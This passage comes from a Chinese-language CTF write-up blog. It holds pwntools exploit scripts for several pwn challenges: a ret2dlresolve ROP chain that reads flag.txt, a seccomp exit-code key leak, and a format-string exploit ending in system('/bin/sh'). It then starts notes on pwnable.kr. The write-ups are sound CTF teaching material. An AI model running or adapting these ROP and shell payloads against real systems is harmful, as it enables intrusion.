fakeRela <span class="token operator">=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>symOffset <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x18</span>

dlresolve <span class="token operator">=</span> fakeStr <span class="token operator">+</span> fakeSym <span class="token operator">+</span>  fakeRela
baseStage <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xc00</span> <span class="token comment"># this for the second stack pvioting, or the read data will destory the return frame</span>
control <span class="token operator">=</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401020</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>fakeRelaAddr <span class="token operator">-</span> rel<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> \
        csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> baseStage<span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>leave<span class="token punctuation">.</span>address<span class="token punctuation">,</span> baseStage <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
control <span class="token operator">=</span> control<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> control <span class="token operator">+</span> dlresolve

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># read = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span>
read <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
base <span class="token operator">=</span> read <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"read : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>read<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"base : </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># open and sendfile</span>
<span class="token comment"># 0xdfece : pop rcx ; pop rbx ; ret # notice this is in the local libc which version is 2.39</span>
<span class="token comment"># 0x10257e : pop rcx ; pop rbx ; ret</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>baseStage <span class="token operator">+</span> <span class="token number">136</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rsi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span>\
        p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rsi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rdx<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>\
        p64<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token number">0x10257e</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'sendfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'exit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"flag.txt\x00"</span>
<span class="token comment"># the lrop.rdx.address is point to : 0x119431 which is pop rdx ; pop r12 ; ret. my bad :( , i think it will only the pop rdx, ret.</span>

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h5 id="pwn-iloveseccomp"><a href="#pwn-iloveseccomp" class="headerlink" title="pwn&#x2F;iloveseccomp"></a>pwn&#x2F;iloveseccomp</h5><p>这题用了一个python脚本来交互。逻辑是先会生产一个key文件，里面存8个随机字节。然后启动程序8次，而且会打印出程序退出的状态码，运行完8次之后问你key文件内容是什么。看起来是要通过main程序泄露数据。 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom
<span class="token keyword">import</span> pwn
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  key <span class="token operator">=</span> urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"key.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
  <span class="token keyword">return</span> key

<span class="token keyword">def</span> <span class="token function">prog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  r <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
  sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">try</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"my guy"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
  r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
  sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Process exited with code </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>poll<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
  userKey <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Okay... WHAT IS THE KEY (in hex) "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> userKey <span class="token operator">==</span> key<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Lucky guess..."</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"nope"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"***The program will run eight times***\n"</span><span class="token punctuation">)</span>
  key <span class="token operator">=</span> init<span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    prog<span class="token punctuation">(</span><span class="token punctuation">)</span>
  check<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>查看保护</p>
<p><img src="https://s2.loli.net/2024/08/19/KkzQaVjOClyDugU.png" alt="d4abdb282f4542628b59de4825e9b0ba.png"></p>
<p>首先读了8个字节的随机数据， 然后将这个值&amp;0xFFFFFFFF000LL，并将其存入randAddr这个变量里，这个变量在bss段。然后用这个值作为段基址，mmap这个key文件到内存，也就是randAddr指向的地址里存放着key的内容。然后存在一个栈溢出，并开启seccomp。 </p>
<p><img src="https://s2.loli.net/2024/08/19/QS8gBHfod31eZrs.png" alt="3c4b4109abda4d7d90366e2b5ff4f378.png"></p>
<p>查看seccomp里面的内容，只允许执行ext</p>
<p><img src="https://s2.loli.net/2024/08/19/sGHaFmMgEtYQ7qo.png" alt="a0952d33b8254aa6a5f23b03d07772b5.png"></p>
<p>exit的状态码其实是自己填的（状态码返回在rdi寄存器里面），所以可以通过这个来泄露，但是exit只能泄露出最低字节，所以我们一共有8字节需要泄露就需要8次，刚好与题目对应上了。由于seccomp的存在，没法泄露数据，所以只能从一路打gadget没法打syscall（exit调用除外）或者其他的orw一类需要用到read，write，open等系统调用的链。好就好在这，可以锻炼手动写rop chain的能力。</p>
<p>为了泄露数据，我们要能知道程序的pie，libc他已经给了所以我们是知道libc的基址。那么libc中的gadget都可以用。</p>
<p><img src="https://s2.loli.net/2024/08/19/QcqNGspAhiu3xOy.png" alt="7cde6409e61247968a5abf1126d4a4c7.png"></p>
<p>寄存器中其实保留了部分程序的信息，例如rbx中存在了__libc_csu_init的地址，那我们就可以得到pie的基址，然后再加上randAddr的偏移，对其解引用就可以得到randAddr的具体值，也就可以得到key的内容，最后将其转移到rdi再调用syscall进行泄露即可。第一次写这种题目，下次做题遇到这种没见过的题目一定要有耐心！！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    
  key <span class="token operator">=</span> <span class="token string">b""</span>

  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">"Sympathy leak:"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x110cc0</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    
    MOV_RAX_RBX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000008d883</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>
    SUB_RAX_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000b1d58</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    ADD_RAX_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000a8978</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    POP_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000023b6a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    DEREF_RAX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000001411fc</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span> 
    XCHG_EDI_EAX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000f1b65</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> MOV_RAX_RBX <span class="token operator">+</span> POP_RDI <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">11256</span><span class="token punctuation">)</span> <span class="token operator">+</span> SUB_RAX_RDI
    pl <span class="token operator">+=</span> DEREF_RAX <span class="token operator">+</span> POP_RDI <span class="token operator">+</span> p64<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> ADD_RAX_RDI <span class="token operator">+</span> DEREF_RAX <span class="token operator">+</span> XCHG_EDI_EAX <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>exit<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Process exited with code "</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    key <span class="token operator">+=</span> n<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'litte'</span><span class="token punctuation">)</span>
  
  lg<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span>
  sl<span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h5 id="pwn-How-to-Raise-a-Boring-Vuln-Flat"><a href="#pwn-How-to-Raise-a-Boring-Vuln-Flat" class="headerlink" title="pwn&#x2F;How to Raise a Boring Vuln Flat"></a>pwn&#x2F;How to Raise a Boring Vuln Flat</h5><p>有点变形的那种house of roman，没怎么做过先留着吧。以后等变强了再来看看。 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    sl<span class="token punctuation">(</span><span class="token string">b"5"</span><span class="token punctuation">)</span>

    pl <span class="token operator">=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%157"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%186"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$10c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    sl<span class="token punctuation">(</span><span class="token string">b"-7"</span><span class="token punctuation">)</span>
    stdout <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token string">b"\x20\x01"</span>

    sl<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">b"\xe0"</span><span class="token punctuation">)</span>
    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">b"\xe0"</span><span class="token operator">+</span>r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>_IO_2_1_stdin_
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

    sl<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
    
    pl <span class="token operator">=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%158"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b"-7"</span><span class="token punctuation">)</span>

    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>binsh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>ret<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
      <categories>
        <category>学习</category>
        <category>笔记</category>
        <category>比赛</category>
      </categories>
      <tags>
        <tag>坐牢</tag>
        <tag>二进制</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr做题笔记（一）</title>
    <url>/2024/08/12/pwnable-kr%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<p><strong>目录</strong></p>
<p><a href="#%E7%AC%AC%E4%B8%80%E9%A2%98-fd">第一题-fd</a></p>
<p><a href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-col">第二题-col</a></p>
<p><a href="#%E7%AC%AC%E4%B8%89%E9%A2%98-bof">第三题-bof</a></p>
<p><a href="#%E7%AC%AC%E5%9B%9B%E9%A2%98-flag">第四题-flag</a></p>
<p><a href="#%E7%AC%AC%E4%BA%94%E9%A2%98-passcode">第五题-passcode</a></p>
<p><a href="#%E7%AC%AC%E5%85%AD%E9%A2%98-random">第六题-random</a></p>
<p><a href="#%E7%AC%AC%E4%B8%83%E9%A2%98-input2">第七题-input2</a></p>
<p><a href="#%E7%AC%AC%E5%85%AB%E9%A2%98-leg">第八题-leg</a></p>
<p><a href="#%E7%AC%AC%E4%B9%9D%E9%A2%98-mistake">第九题-mistake</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E9%A2%98-shellshock">第十题-shellshock</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E9%A2%98-coin1">第十一题-coin1</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E9%A2%98-blackjack">第十二题-blackjack</a></p>
<p>[ 第十三题-lotto](# 第十三题-lotto)</p>
<hr>
<h5 id="第一题-fd"><a href="#第一题-fd" class="headerlink" title="第一题-fd"></a>第一题-fd</h5><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;stdlib.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pass argv[1] a number\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
